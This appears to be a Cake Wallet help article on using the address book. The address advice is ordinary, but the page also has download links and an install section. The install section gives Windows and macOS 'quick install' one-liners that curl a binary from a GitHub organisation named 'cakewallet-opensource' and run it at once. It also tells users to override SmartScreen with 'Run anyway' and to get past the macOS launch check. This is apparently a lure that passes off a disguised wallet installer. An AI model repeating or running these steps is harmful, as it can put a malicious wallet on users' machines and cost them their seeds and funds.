![Cake Wallet address book guide](assets/cake-wallet-address-book-article-banner.png)

# Use the Cake Wallet Address Book

Save the addresses you reuse, and send to a label instead of a paste.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Save an address with a label from the send or receive screen, then pick that entry at send time instead of pasting. The address book prevents copy errors, not wrong-network mistakes: an entry saved for one chain will still fail on another. Check the first send to a new saved address before you rely on it.

<!-- ARTICLE-BODY-BEGIN -->

## Saving an address you trust
A saved entry is only as good as the moment you saved it. Add addresses you have already sent to successfully, not ones pasted from a message, and give the label enough detail to recognise later: the person, the purpose and the chain.

An address book full of "wallet 1" and "wallet 2" entries is worse than none, because it invites a confident click on the wrong row. Label by destination rather than by sequence.

## Receiving crypto in Cake Wallet
To receive, open the right wallet and account, show the receive screen and share that address or QR code. The address belongs to the wallet you have open, so switching wallets changes the address you are looking at.

Sharing the wrong chain's address is the failure this page cannot prevent. A Bitcoin address given to someone sending Litecoin produces a loss that no address book entry undoes. Confirm the coin before you copy.

## Sending to a saved address
At send time, choose the entry instead of typing, then check the first characters and the last few against what you expect. Malware that swaps clipboard contents is a real attack, and picking from a list bypasses it only if the saved entry was correct in the first place.

Send a small amount first when the destination is new. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md">Funds not appearing after a send</a> covers what to check if the recipient says nothing arrived, and why the transaction ID settles it faster than another send.

## Keeping purposes apart
Separate wallets make separate address books meaningful: a business wallet and a personal wallet with overlapping entries is a mis-send waiting to happen. Multiple wallets each have their own phrase, which is also what keeps their backups separate.

<a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md">Manage multiple wallets</a> explains what a second wallet actually isolates, including what a wallet group does not share.

## Reconciling saved contacts with history
When a saved address and a payment disagree, the transaction history is the record that decides. Export it and match the address rather than relying on memory.

<a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-export-transaction-history.md">Export Cake Wallet transaction history</a> covers the export and what it can prove, which matters for accounting as well as for a disputed send.

## Current release
Address handling changes with the app, and an old build can behave differently on validation and on labels. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> so the address you save is one the current app can check.

If an entry will not save at all, the address format is usually the reason, and the right response is to check the chain rather than to force it.

## FAQ
### How do I use the address book?
Save a labelled address from the send or receive screen, then choose it at send time instead of pasting.
### Can I send BTC to Cake Wallet?
Yes. Share your Bitcoin address from the Bitcoin wallet and have the sender use the Bitcoin network.
### How do I send from an exchange to Cake Wallet?
Copy the address from the wallet, paste it into the exchange's withdrawal form, and choose the matching network.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[funds not appearing after a send](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md) · [export Cake Wallet transaction history](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-export-transaction-history.md) · [manage multiple wallets](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
